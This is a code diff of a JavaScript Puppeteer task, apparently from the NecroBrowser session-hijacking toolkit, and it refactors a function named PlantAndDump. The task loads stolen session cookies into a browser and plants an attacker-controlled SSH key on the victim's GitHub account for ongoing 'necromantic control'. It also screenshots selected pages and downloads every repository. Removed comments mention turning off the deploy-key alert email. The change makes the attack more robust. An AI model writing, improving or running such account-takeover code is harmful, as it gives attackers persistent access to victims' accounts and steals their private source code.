@@ -1,83 +1,42 @@
-const db = require('../../db/db')
-const necrohelp = require('../../tasks/helpers/necrohelp')
-const necrolib = require('./necrolib')
+'use strict';
+
+const db = require('../../db/db');
+const necrohelp = require('../helpers/necrohelp');
+const clusterLib = require('../../puppeteer/cluster');
+const necrolib = require('./necrolib');
 
 exports.PlantAndDump = async ({ page, data: [taskId, cookies, params] }) => {
+    await necrohelp.runTask(db, taskId, async () => {
+        necrohelp.requireArray(params?.urls, 'params.urls');
+        await necrohelp.SetCookieJar(page, cookies);
+        await necrohelp.ConfigureUserAgent(page, params?.userAgent, taskId);
+        await necrohelp.timedGoto(page, params.fixSession || 'https://github.com');
+        await necrohelp.Sleep(1000);
 
-    // update initial task status from queued to running
-    await db.UpdateTaskStatus(taskId, "running")
-
-   
-    // go to defined page and check for authentication
-    console.log(`[${taskId}] invoking session with fixSession: ${params.fixSession}`)
-    await page.goto("https://github.com");
-
-    const cc = await page.cookies();
-    console.log("current cookies: ", cc);
-
-    // Sleep 5s
-    console.log(`[${taskId}] sleeping for 5s`)
-    await necrohelp.Sleep(5000);
-
-    await necrohelp.SetCookies(page, params.cookies)
-    await necrohelp.ConfigureUserAgent(page, params.userAgent, taskId);
-    console.log("typeof params.cookies: ", typeof params.cookies);
-
-    // Refresh the page to apply the cookies
-    await page.reload();
-    await necrohelp.Sleep(5000);
-
-    
-
-    // go to defined page and check for authentication
-    //await page.goto(params.fixSession);
-
-    // increase zoom for debugging purposes when running in gui mode
-    //await necrohelp.SetPageScaleFactor(page, clusterLib.GetConfig().cluster.page.scaleFactor)
-
-    /*
-        // check if we see the github top left logo, meaning we are authenticated OK
-        const loggedInSelector = "document.querySelector(\"svg[class='octicon octicon-mark-github v-align-middle']\")";
-        const logo = await page.evaluate(loggedInSelector).catch(console.error);
-        if (typeof logo !== 'undefined' && logo !== null){
-            console.log(`[${taskId}] session is invoked correctly. github logo: ${logo}`)
-        }else{
-            await db.UpdateTaskStatusWithReason(taskId, "error", "session seems NOT authenticated")
-            return
+        await necrolib.PlantSshKey(page, taskId, 'ssh-key-dev', params.sshKey);
+        const failures = [];
+        for (const [index, url] of params.urls.entries()) {
+            try {
+                await necrohelp.timedGoto(page, url);
+                await necrohelp.Sleep(3000);
+                const name = String(new URL(url).pathname.split('/').filter(Boolean).pop() || 'index')
+                    .replace(/[^a-z0-9._-]/gi, '_');
+                await page.screenshot({
+                    path: necrohelp.getOutputPath(clusterLib.GetConfig(), `screenshot_${taskId}_${index}_${name}.png`)
+                });
+            } catch (error) {
+                failures.push({ url, error: error.message });
+            }
         }
-        */
-    console.log("Planting SSH");
+        if (failures.length === params.urls.length) {
+            throw new Error(`All GitHub screenshots failed: ${failures.map(item => item.error).join('; ')}`);
+        }
 
-    // check Notification if "'Deploy key' alert email" is ON
-    // if ON ->  TURN IT OFF
-    // TODO needs fixing to get properly the button
-    //await necrolib.DisableDeployKeyAlert(page, taskId).catch(console.error)
-
-    // plant necrobrowser ssh-key for necromantic control
-    await necrolib.PlantSshKey(page, taskId, 'ssh-key-dev', params.sshKey).catch(console.error)
-
-    // screenshot urls of interest
-    for(let url of params.urls){
-        // TODO fix ScreenshotFullPage errors..
-        // await necrohelp.ScreenshotFullPage(page, taskId, url).catch(console.error)
-        let pName = url.split("/").reverse()[0]
-        await page.goto(url);
-        console.log(`[${taskId}] taking screenshot of page --> ${pName}`)
-        await necrohelp.Sleep(3000)
-        await page.screenshot({path: `extrusion/screenshot_${pName}_${taskId}.png`});
-    }
-
-    // scrape all repositories and download master branches as ZIP
-    let repositories = await necrolib.ScrapeRepos(page, taskId)
-    for (let repo of repositories){
-        console.log(`[${taskId}] downloading repo --> ${repo}`)
-        await necrolib.DownloadRepo(page, taskId, repo)
-        await necrohelp.Sleep(5000)
-    }
-
-    // this task is completed, so update the status accordingly
-    await db.UpdateTaskStatus(taskId, "completed")
+        const repositories = await necrolib.ScrapeRepos(page, taskId);
+        for (const repository of repositories) {
+            await necrolib.DownloadRepo(page, taskId, repository);
+            await necrohelp.Sleep(5000);
+        }
+        return failures.length ? { status: 'partial', failures } : { status: 'completed' };
+    });
 };
-
-
-
